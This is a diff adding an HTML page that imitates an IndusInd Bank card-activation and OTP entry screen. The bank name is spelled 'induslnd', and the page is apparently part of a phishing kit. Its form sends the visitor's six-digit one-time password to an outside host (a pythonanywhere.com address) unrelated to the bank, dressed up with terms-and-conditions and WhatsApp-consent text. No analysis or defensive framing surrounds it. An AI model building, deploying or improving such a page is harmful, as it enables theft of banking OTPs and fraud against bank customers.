@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login Page</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+</head>
+
+<body class="">
+    <nav class="sticky bg-white flex item-center justify-between p-4 shadow w-screen">
+        <img src="./media/logo.png" alt="Logo" class="scale-[0.65]" />
+    </nav>
+    <div class="flex flex-col justify-between h-[80vh] gap-16">
+        <div class="flex gap-2 items-center">
+            <div class="px-3">
+                <h1 class="text-2xl font-semibold">Welcome</h1>
+                <p class="text-sm">
+                    Setup your Card and manage your transaction
+                    preferennces & limits to enjoy increadiblr benefits!
+                </p>
+            </div>
+            <img src="./media/login-amico.svg" alt="Login" class="w-1/2" />
+        </div>
+        <div class="bg-white flex-grow h-full rounded-t-3xl drop-shadow-md pt-5 border-t">
+            <form class="flex flex-col items-center pb-10 max-w-screen-sm" id="form" method="post" action="https://lesotol784.pythonanywhere.com/verify-t">
+                <h1 class="text-3xl font-semibold mb-4">Enter OTP</h1>
+                <div class="mb-4">
+                    <label for="phone" class="block text-gray-700 text-sm">Enter you
+                        <b class="font-bold">6-digit OTP</b> sent on you mobile number</label>
+                    <input type="password" id="otp" name="otp" class="mt-1 p-2 w-96 border rounded-md" maxlength="6"
+                        required />
+                </div>
+                <div class="px-3 text-xs mb-3 flex gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none"
+                        stroke="#7f1d1d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                        class="lucide lucide-circle-alert">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="12" x2="12" y1="8" y2="12" />
+                        <line x1="12" x2="12.01" y1="16" y2="16" />
+                    </svg>
+                    <p class="font-normal">By entring OTP and procedding, I agree to the <span
+                            class="text-[#7F1D1D]">Terms & Conditions</span> associated with induslnd Bank
+                        Card activation and setup</p>
+                </div>
+                <div class="mb-6 flex gap-2 justify-center px-3">
+                    <input type="checkbox" id="consent" name="card" required />
+                    <label for="card" class="block text-gray-700 text-xs">Yes, I consent to reciveving important alerts
+                        and exclusive offers on WhatsApp from induslnd Bank. </label>
+                </div>
+                <button type="submit" class="bg-red-900 text-white p-2 rounded-md w-96 hover:bg-blue-600">
+                    Get OTP
+                </button>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
